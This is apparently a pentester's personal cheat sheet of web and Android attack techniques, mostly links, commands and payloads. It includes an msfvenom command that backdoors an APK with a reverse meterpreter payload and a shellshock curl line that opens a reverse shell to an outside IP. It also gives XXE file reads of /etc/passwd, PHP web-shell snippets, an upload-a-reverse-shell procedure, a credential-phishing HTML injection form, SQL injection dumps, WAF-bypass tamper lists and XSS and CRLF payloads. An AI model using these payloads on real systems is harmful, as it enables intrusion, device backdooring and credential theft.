Port Tunneling over Port Forwarding -- use ngrok.com or portmap.io
msfvenom -x UC.apk -p /android/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -0 UC_1.apk
d2j-apk-sign UC1.apk
https://pengs.win/how-to-make-a-persistent-android-backdoor-using-metasploit/



https://techvomit.net/web-application-penetration-testing-notes/
https://github.com/swisskyrepo/PayloadsAllTheThings 					--good resource
https://github.com/OWASP/CheatSheetSeries/tree/master/cheatsheets
https://github.com/sumas/OSCP-Cheatsheet-God  							--good resource
https://github.com/BlackArch/webshells
https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/
https://www.owasp.org/images/2/20/Microservice_Security.pdf				--Microservice pentest guide



OGNL expression injection <>!@#$%^&*()_+=-}{[]|\;:'",.?/
Object-Graph Navigation Language (OGNL) is an expression language for handling Java objects. When an OGNL expression injection vulnerability is present, it is possible for the attacker to inject OGNL expressions. These expressions can execute arbitrary Java code.
Searching for this vulnerability in a black box environment is easy, and have the same approach as searching for SSTI vulnerabilities. We can inject OGNL expressions in all user supplied data fields and see if we get any response back indicating that the expression has been handled and executed on the server.
An example of an expression to use could be as simple as:	foobar%{191*7}
where %{191*7}is the expression. The output from this would be 1337. These expressions can of course be something other than just mathematical, but this is a way to easily detect the vulnerability.



SSL Certificates are small data files that digitally bind a cryptographic key to an organization’s details. When installed on a web server, it activates the padlock and the https protocol (over port 443) and allows secure connections from a web server to a browser. Typically, SSL is used to secure credit card transactions, data transfer and logins, and more recently is becoming the norm when securing browsing of social media sites. SSL Certificates bind together:
A domain name, server name or hostname.
An organizational identity (i.e. company name) and location


Nmap commands (Export,des40 = FREAK)
Geo-Location				nmap --script=asn-query,whois,ip-geolocation-maxmind <target>
							nmap -sU -pU:123 -Pn -n --script ntp-monlist,ntp-info
							nmap -sU -p 53 --script=dns-recursion <target>
TLS Fallback				openssl s_client -connect <>:443 -fallback_scsv -no_tls1_2
detection					map -sV -sC -Pn -A -vv <target>
							nmap -sn <range> <sweep command>
							nmap --script ssh2-enum-algos
							nmap -sS -n -Pn -vvv --open
							/usr/share/nmap/scripts | grep ssh
               
                


DNS inverse queries, DNS zone Transfers, web based DNS Searches 

-dig redhat.com ANY +noall +answer 	      //all records
-dig -x 209.132.183.81 			            //reverse lookup
-dig @ns1.redhat.com redhat.com 	         // query name server




Check source-code for information disclosures
Requesting invalid pages and checking errors for Information Reveal
Check contact us, hidden parameters(error generation), file uploads, import/exports etc.

1.	Crossdomain.xml, robots.txt file detection
2.	Click Back-Button after logging out of a session if the information is revealed
3.	Check for session cookie value pre and post login 
4.	Check cookie expiation by import-export cookie method  (Collect cookies for analysis)
5.	Check registration of 2 accounts with same username or emails
6.	Check broken session by logging into 2 different browsers
7.	Check password reset mechanism for breaches  ////////////
8.	Check vulnerabilities in remember my password implementaion in html page   //////////////
9.	Check if login information is sent over an encrypted channel   /////////(how to using burp)
10.	Analyzing admin panel using fuzzing techniques  ////////////////
11.	Check captcha / weak security question used for authentication present or Not / mass registration
12.	Test for cookie flags an cookie-poisoning attack (insert scripts in cookies + wrong cookie to generate error)
13.	Insufficient mail verification process
14.	Insufficient 2FA and account lockout
15.	Directory traversal using nmap scripts for specific device types (get scripts from google)
16.	



17.	Clickjacking X-frame options: Sameorigin bypassing: https://translate.google.com/translate?hl=en&sl=en&tl=hi&u=https%3A%2F%2Fmicrosoft.com&anno=2
https://hackerone.com/reports/283951


18.	Test the Role and Privilege Manipulation to Access the Resources
19.	HTTP methods and XST for credentials of legitimate users   //////////////
20.	Csrf---inspecting Encryption and reuse of session token, Proxies and caching   ///////////////


21.	Server side includes (  <!--#exec cmd="ls" --> <!--#exec cmd="cd /root/dir/">   )


22.	Data validation using various injections
	- LDAP injection testing for sensitive information about users and hosts
	- IMAP/SMTP injection Testing for Access the Backend Mail server.
	- XPATH Injection Testing for Accessing the confidential information
	- CSV file injection (  =cmd|'/C calc'!A0		=cmd|’/C ping -t 192.168.2.107 -l 25152′!’A1′	)

•	Buffer Overflows
•	Remote file inclusion/ Local file inclusion../../../etc/Passwd or ..//..//..//..//etc/Passwd  or use KALI's
dotdotpwn.pl perl script
•	Account deletion functionality
•	Dos attack perform
•	Content-spoofing
•	Bogus method for firewall bypass
•	Forgot password sends key in response to check

Inurl:view index.shtml  //scan for CCTV information.

Android Application Testing
adb tcpip 5555
adb connect 
adb shell ps
adb logcat --pid=<pid>
adb shell pm path com.example.someapp 		## get full path of the application
adb pull /data/app/com.example.someapp-2.apk  	## download the app to the development machine
adb shell dumpsys meminfo com.package.name	## Dump memory information
adb shell dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp' ## print current app's opened activity

-- extract private packages for any app from android device 
run-as <package> cat <file> (access the private package files)
	$ run-as {app-package-name}
	$ cd /data/data/{app-package-name}
	$ chmod 777 {file}	
	$ cp {file} /mnt/sdcard/

adb backup -apk -all -f backup.ab (backup settings and apps)
adb backup -apk -shared -all -f backup.ab (backup settings, apps and shared storage)

adb backup  -f myAndroidBackup.ab  com.corp.appName
	This archive can be converted to tar format using:
dd if=myAndroidBackup.ab bs=4K iflag=skip_bytes skip=24 | openssl zlib -d > myAndroidBackup.tar
tar xvf myAndroidBackup.tar

	Reference:	http://nelenkov.blogspot.ca/2012/06/unpacking-android-backups.html



https://github.com/mirfansulaiman/Command-Mobile-Penetration-Testing-Cheatsheet

Android Objection   -- 
https://github.com/sensepost/objection/wiki/Patching-Android-Applications
https://github.com/sensepost/objection/wiki/Using-objection

Android Frida  -- 
-- Install frida on android
adb root 		## root required to run frida
adb push frida-server /data/local/temp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

--Frida commands
frida-ps -U 		## connect frida over USB and list running processes
frida-ps -Ua 		# running applications
frida-ps -Uai		# list installed applications
frida-ps -D <id>	# connect frida to a specific device
frida-trace -U -f com.app.testing -I "libcommonCrypto*"  # crypto API calls

frida-trace -U -i  open com.app.testing  ## trace every function while program start

frida -U -l <script>.js --no-pause -f <application>


Sample code: Root detection bypass example
setTimeout(function() { 	// avoid java.lang.ClassNotFoundException
	Java.perform(function() {		
		var hook = Java.use("com.target.utils.RootCheck");     -- Rootcheck is name of the class
		console.log("info: hooking RootCheck class");
		hook.isRooted.overload().implementation = function() {   -- isRooted is the name of the function to be overloaded
			console.log("info: entered target method");
			
			var retval = this.isRooted.overload().call(this);	// obtain old retval
 			console.log("old ret value: " + retval);		// set new retval
			var retnew = false;
			console.log("new ret value: " + retnew);
			return retnew;
		}
	});   
}, 0);


http://th3-incognito-guy.blogspot.com/2014/09/drozer-security-attack-framework-for.html

https://github.com/swdunlop/AndBug  - To enumerate class and method on application
https://github.com/linkedin/qark    - Quick Android Review Kit 
 





---------------------------------------------------------------------------------------------------------------------------------
CSRF with 307 redirect: required with JSON is implemented for calls which is CSRF free
https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b  --good article



shellshock -- 
curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status
curl -H "X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.81.128 443" 192.168.81.131/cgi-bin/helloworld.cgi


slowloris attack -- sending valid requests to a server superslowly. so if a server is not implementing timeout then it results in dos attack.


heartbleed: SSL/TLS weakness to read system memory via sending the malicious heartbeat(no size of request validation) and there is no limit on the number of attacks that can be performed.
http://www.garage4hackers.com/entry.php?b=2551
openssl s_client -connect domain.com:443 -tlsextdebug 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo safe



Java Deserialization vulnerability: 

EXPLOIT: https://github.com/joaomatosf/jexboss
		 https://<target-website>/invoker/JMXInvokerServlet
Serialization refers to a process of converting an object into a format which can be persisted to disk (for example saved to a file or a datastore), sent through streams (for example stdout), or sent over a network. The format in which an object is serialized into, can either be binary or structured text (for example XML, JSON YAML…). JSON and XML are two of the most commonly used serialization formats within web applications.
Deserialization on the other hand, is the opposite of serialization, that is, transforming serialized data coming from a file, stream or network socket into an object.
Web applications make use of serialization and deserialization on a regular basis and most programming languages even provide native features to serialize data (especially into common formats like JSON and XML). It’s important to understand that safe deserialization of objects is normal practice in software development. The trouble however, starts when deserializing untrusted user input.



HOST HEADER INJECTION:
https://URL?host_header=x-forwarded-host/host
X-Forwarded-Host: google.com
curl --verbose --header 'Host: www.example.com' 'https://www.test.com/member/themes/html/portal/images/utility?host_header=host'


XML Injection: 
SAML XML injection reference:
https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/#saml-request-example
https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/#a-very-brief-review
https://research.aurainfosec.io/bypassing-saml20-SSO/

<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
   <foo>&xxe;</foo>


<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>


<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>


<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://grabify.link/CSZPYU</string></value>
</param>
<param>
<value><string>https://blog.jet.com/</string></value>
</param>s
</params>
</methodCall>


<?xml version="1.0"?> 
<methodCall> 
<methodName>test.method</methodName> 
<params> 
<param> 
<value><name>','')); phpinfo(); exit;/*</name></value> 
</param> 
</params> 
</methodCall> 


<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
     <methodName>wp.getUsersBlogs</methodName>
        <params>
           <param><value>administrator</value></param>
           <param><value>admin</value></param>
       </params>
</methodCall>


POST $URL
Content-type: text/xml 
Content-Length: 44  <!DOCTYPE a PUBLIC "-//B/A/EN" "C:\windows">



xmlrpc.php exploit:   (SSRF attack calling self XMLRPC.php)
https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
https://hackerone.com/reports/325040




open S3 bucket + Subdomain Takeover of the buckets:
aws s3 ls s3://www.echoware.com/ --no-sign-request --region us-west-2
https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn/
https://0xpatrik.com/takeover-proofs/  --better post
https://blog.securitybreached.org/2018/09/24/subdomain-takeover-via-unsecured-s3-bucket/
https://www.we45.com/blog/how-an-unclaimed-aws-s3-bucket-escalates-to-subdomain-takeover




time-based sql injection:
www.vuln-web.com/photo.php?id=1" and sleep(10)--
www.vuln-web.com/photo.php?id=1" and sleep(10)#
www.vuln-web.com/photo.php?id=1" and sleep(10)/*
www.vuln-web.com/photo.php?id=1" and sleep(10)--+
	1'=sleep(10)='1 
	'=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
	'=IF(MID(VERSION(),1,1)=5,SLEEP(10),0)='1
	1 ' or true# 
	1 ' or false#

General Tamper testing:
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes

MSSQL:
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes

MySQL:
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor


WAF Bypass with sqlmap 
sqlmap.py -u "URL" --batch --banner --tamper=modsecurityversioned 
https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/  --beginners resource





XSS Payloads:
<script>alert(1)</script>
"><img src=# onmouseover=alert(1)>
"><img src=# onload=prompt(1)>
"><svg/onload=alert(1)>
<svg/onload=prompt(1)
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
';alert(String.fromCharCode(88,83,83))
'">><marquee><img src=x onerror=confirm(1)></marquee>">
<IMG SRC=JaVaScRiPt:alert()>
<scr ipt>{JAVASCRIPT}</scr ipt>
"><script>{JAVASCRIPT}</script>
"><script>{JAVASCRIPT}</script><"
'><script>{JAVASCRIPT}</script>
'><script>{JAVASCRIPT}</script><'
onerror='{JAVASCRIPT}'
onload="{JAVASCRIPT}"
"""><SCRIPT>{JAVASCRIPT}
<img scr=x onerror=alert()>

http://vulniis      /uncpath/%3Cimg%20onerror=alert('xss')%20src=/%3E:/
https://mothereff.in/utf-8





HTTP header injection (CRLF)
http://test1.com\n\rtest2.com
req: http://inj.example.org/redirect.asp?origin=foo%0d%0aSet-Cookie:%20ASPSESSIONIDACCBBTCD=SessionFixed%0d%0a
https%3A%2F%2Fads.twitter.com%2Fsubscriptions%2Fmobile%2Flanding%3Ft%3D%250d%250aSet-Cookie%3A%2520csrf_id%3Dinjection%253b
/%0d%0aset-cookie%20%3amycookie%3dmyvalue;%20%44omain%20%3d.hackerone.com
/__session_start__/%0aSet-Cookie:NEW_COOKIE123


response:
HTTP/1.1 302 Object moved
Connection: close
Location: account.asp?origin=foo
Set-Cookie: ASPSESSIONID=SessionFixed
Content-Length: 121



css injection: 
https://www.computerlease.com/Default.aspx/%7B%7D*%7Bcolor:red;%7D//app/SubCon/Sub1028/style-08252015.css?636589332857486861
http://blog.portswigger.net/2015/02/prssi.html



ssl cert signed using the private key
Missing Content-Type Header
Misconfigured Access-Control-Allow-Origin Header -- CORS vulnerability
Content-Disposition: attachment; filename=f.txt header vulnerability
Cookie Values Used in Anti-CSRF Token
.DS_Store File Found.
_ViewState MAC Disabled         -->           http://blog.ptsecurity.com/2012/01/viewstate-vulnerabilities.html
.net enabled servers locate trace.axd files (High severity)


httpd.conf
apache.conf  
.htaccess



CORS
curl --head https://fred.int.knowledgehound.com/ -H "Origin:Whitehat.com" -I



Remote Code Execution: File upload GIFSICLE tool to add --comment to a valid gif file to bypass pre defined functions
/etc/../etc/passwd
https://hackersonlineclub.com/command-injection-cheatsheet/
<?php system("echo XX");?>
%7cid
<?php $t=$_SERVER['pwd']; system($t); ?>
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>
php?page=expect://ls
/fi/?page=php://input&cmd=ls
vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/resource=/etc/passwd
<? system(‘uname -a’);?>
file://../etc/passwd
/..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts -- double URL encode


1. Create a PHP reverse shell
2. Compress to a .zip file
3. Upload the compressed shell payload to the server
4. Use the zip wrapper to extract the payload using: php?page=zip://path/to/file.zip%23shell
5. The above will extract the zip file to shell, if the server does not append .php rename it to shell.php instead



HTML Template Injection: 
http://127.0.0.1/vulnerable.php?name=<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST" action="http://attackerserver/login.php">Username: <input type="text" name="username"/><br/>Password: <input type="password" name="password" /><br /><input type="submit" value="Login" /></form><!--

HTML injection :   <iframe src="https://www.example.com" width="500" height="500"></iframe>



Four Ways to Bypass Android SSL Verification and Certificate Pinning
https://blog.netspi.com/four-ways-bypass-android-ssl-verification-certificate-pinning/
https://www.frida.re/



SSRF Injection Payloads 
                        	GET /?url=http://localhost/server-status HTTP/1.1
                        	Scanme.nmap.org:80
https://github.com/trapp3rhat/SSRF-Injection



e-mail header injection
mailto2340%40gmail.com%5Cnbcc%3Amailto2342%40gmail.com
tester@test.com\nbcc:test@test.com





server side includes
	<!--#exec cmd="ls -l" -->

	
Mail Spoofing 
	https://emkei.cz/





SPF (Sender Policy Framework) is a DNS text entry which shows a list of servers that should be considered allowed to send mail for a specific domain. Incidentally the fact that SPF is a DNS entry can also considered a way to enforce the fact that the list is authoritative for the domain, since the owners/administrators are the only people allowed to add/change that main domain zone.

DKIM (DomainKeys Identified Mail) should be instead considered a method to verify that the messages’ content are trustworthy, meaning that they weren’t changed from the moment the message left the initial mail server. This additional layer of trustability is achieved by an implementation of the standard public/private key signing process. Once again the owners of the domain add a DNS entry with the public DKIM key which will be used by receivers to verify that the message DKIM signature is correct, while on the sender side the server will sign the entitled mail messages with the corresponding private key.

DMARC (Domain-based Message Authentication, Reporting and Conformance) empowers SPF and DKIM by stating a clear policy which should be used about both the aforementioned tools and allows to set an address which can be used to send reports about the mail messages statistics gathered by receivers against the specific domain [1].

A reverse proxy server is a type of proxy server that typically sits behind the firewall in a private network and directs client requests to the appropriate backend server. A reverse proxy provides an additional level of abstraction and control to ensure the smooth flow of network traffic between clients and servers.




/includes/
/misc/
/modules/
/profiles/
/scripts/
/themes/
/CHANGELOG.txt
/cron.php
/INSTALL.mysql.txt
/INSTALL.pgsql.txt
/install.php
/INSTALL.txt
/LICENSE.txt
/MAINTAINERS.txt
/update.php
/UPGRADE.txt
/xmlrpc.php
/admin/
/comment/reply/
/contact/
/logout/
/node/add/
/search/
/user/register/
/user/password/
/user/login/




study notes:

https://www.synopsys.com/content/dam/synopsys/sig-assets/whitepapers/exploiting-the-java-deserialization-vulnerability.pdf
https://www.youtube.com/watch?v=r4liwEQm14o  --RCE demonstration
https://www.troyhunt.com/owasp-top-10-for-net-developers-part-6/
https://stackoverflow.com/questions/10314174/difference-between-pragma-and-cache-control-headers
https://ma.ttias.be/remote-code-execution-via-http-request-in-iis-on-windows/
   curl -v 10.0.1.1/ -H "Host: irrelevant" -H "Range: bytes=0-18446744073709551615"  -buffer overflow command
   
http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection


http://testphp.vulnweb.com/artists.php?artist=1'
/artists.php?artist=-1 order by 1
/artists.php?artist=-1 union select 1,2,3
/artists.php?artist=-1 union select 1,database(),3
/artists.php?artist=-1 union select 1,version(),current_user()
/artists.php?artist=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
/artists.php?artist=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'
/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1
/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1




XSS using referrer header   Parameter: Referer
Description:
1. Navigate to http://sec.us/?'*prompt()*'whscheck
2. Go into your browser’s Developer Tools and open your Web Console
3. Execute the following command:
document.write(“<a/href=\”https://xyz.com/”>click</a>”);
4. Click on newly created link
5. Authenticate to applicaton
6. Observe JavaScript popup
